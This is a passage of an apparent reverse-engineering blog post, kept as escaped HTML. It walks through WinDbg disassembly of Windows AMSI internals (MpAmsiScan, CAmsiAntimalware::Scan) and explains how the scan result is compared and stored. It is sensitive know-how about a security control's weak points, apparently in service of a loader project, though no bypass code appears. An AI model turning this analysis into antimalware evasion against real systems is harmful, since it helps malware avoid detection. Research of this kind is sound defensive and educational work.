&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x11cd&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b395d&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ba11000000&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;edx&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3962&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;448&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bcf&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;r9d&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;edi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3965&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c8d050c700300&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;r8&lt;/span&gt;,[&lt;span style=&#34;color:#66d9ef&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x381e8&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae7ea978&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b396c&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;488&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;b4910&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3970&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;e803f2ffff&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x3e8&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae7b2b78&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3975&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;eb15&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;jmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x11fc&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fff&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ae7b398c&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;it checks validity of some data and calls a function and then returns after setting return value to that of
&lt;code&gt;MpAmsiScan&lt;/code&gt; stored in &lt;code&gt;edi&lt;/code&gt; register, just like the previous one.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b398c&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bc7&lt;/span&gt;             &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;edi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b398e&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;488&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;b5c2440&lt;/span&gt;       &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rbx&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3993&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;488&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;b6c2448&lt;/span&gt;       &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rbp&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3998&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;488&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;b742458&lt;/span&gt;       &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rsi&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b399d&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4883&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c420&lt;/span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b39a1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;415&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;f&lt;/span&gt;             &lt;span style=&#34;color:#66d9ef&#34;&gt;pop&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;r15&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b39a3&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;415&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;e&lt;/span&gt;             &lt;span style=&#34;color:#66d9ef&#34;&gt;pop&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;r14&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b39a5&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;f&lt;/span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;pop&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rdi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fff&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ae7b39a6&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;c3&lt;/span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Because the return value we got from &lt;code&gt;MpAmsiScan&lt;/code&gt; is 0x0, execution path will be the first one we&amp;rsquo;ve discussed
above.&lt;/p&gt;
&lt;p&gt;There is something interesting that we havent discussed about that control flow path. There is a comparison of
&lt;code&gt;rsp+0x54&lt;/code&gt; and 1. if that comparison is able to set zero flag, next instruction sets &lt;code&gt;al&lt;/code&gt; register to 1.&lt;/p&gt;
&lt;p&gt;in our case, &lt;code&gt;rsp+0x54&lt;/code&gt; is not equal to 1.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0:018&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dd&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x54&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;L1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00000015`8864&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;e564&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;which means, &lt;code&gt;al&lt;/code&gt; wont be set to 1. If you can remember, &lt;code&gt;rsp+0x54&lt;/code&gt; is only accessed once, just after the call
to &lt;code&gt;LeaveCriticalState&lt;/code&gt; and that that is the only instruction that sets &lt;code&gt;rsp+0x54&lt;/code&gt; to 0x0. My guess is that this
checks if function has entered the &lt;code&gt;LeaveCriticalSection&lt;/code&gt; block. It then sets &lt;code&gt;[rsi+0C8h]&lt;/code&gt; (rsi == first
parameter) to the value of &lt;code&gt;al&lt;/code&gt;. Note that &lt;code&gt;rsi+0xc8&lt;/code&gt; should be set to zero in order for this function to be
sucessful. We discussed rest of this block earlier.&lt;/p&gt;
&lt;p&gt;after the function returns, we&amp;rsquo;ll end up back at &lt;code&gt;CAmsiAntimalware::Scan&lt;/code&gt;. Good news is, we dont need to read
every instruction since we already know what we are looking for.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/decompiler_call.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Above image shows how the call looks in decompiled pseudo code. return value of the callee is stored in local
variable &lt;code&gt;uVar2&lt;/code&gt;. However, we know this is not accurate because caller need to pass three args to the callee (we see none). That&amp;rsquo;s not important to us though.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/decompiler_var100.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Here, the if confition only evaluate true when &lt;code&gt;loc_rand()&lt;/code&gt; is equal to zero and a global variable is less than 5. &lt;code&gt;loc_rand&lt;/code&gt; is basically the local variable where the random number was stored. Therefore this block is not
going to execute.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/decompiler_check_var2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Above if condition checks if return value (stored in r14) is zero. In our case it is.
we know that the third argument passed to the collee is the address of &lt;code&gt;rsp+0x40&lt;/code&gt; and was passed through &lt;code&gt;r8&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;below image shows disassembly of the above snippet&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1ed&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8357ed&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4585&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;f6&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;test&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;r14d&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;r14d&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8357f0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;757&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;f&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;jne&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x271&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae835871&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1f2&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8357f2&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;448&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;b07&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;r8d&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rdi&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8357f5&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;b442440&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8357f9&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bc0&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;r8d&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8357fc&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;f2d&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;jg&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x22b&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae83582b&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As shown above, &lt;code&gt;mov    r8d, dword ptr[rdi]&lt;/code&gt; moves value at address stored in &lt;code&gt;rdi&lt;/code&gt; into &lt;code&gt;r8&lt;/code&gt; register. &lt;code&gt;rdi&lt;/code&gt; stores the address of &lt;code&gt;AMSI_RESULT&lt;/code&gt; enum passed down to &lt;code&gt;CAmsiAntimalware::Scan&lt;/code&gt; method. it then moves &lt;code&gt;rsp+0x40&lt;/code&gt;, output paramater we discussed earlier into &lt;code&gt;eax&lt;/code&gt; register.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_r8_rax_compare.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;comparison instruction and jump instruction checks if value in &lt;code&gt;r8&lt;/code&gt; (result) is greater than that of in &lt;code&gt;eax&lt;/code&gt; (output parameter). jump wont be taken and execution will directed to the next mov instruction.&lt;/p&gt;
&lt;p&gt;This is basically checking if current scan&amp;rsquo;s result is greater than that of previous one.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1fe&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8357fe&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8907&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rdi&lt;/span&gt;],&lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae835800&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;d8bef&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;r13&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;r15&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae835803&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;488&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;b0df6b70000&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;WPP_GLOBAL_Control&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae841000&lt;/span&gt;)]
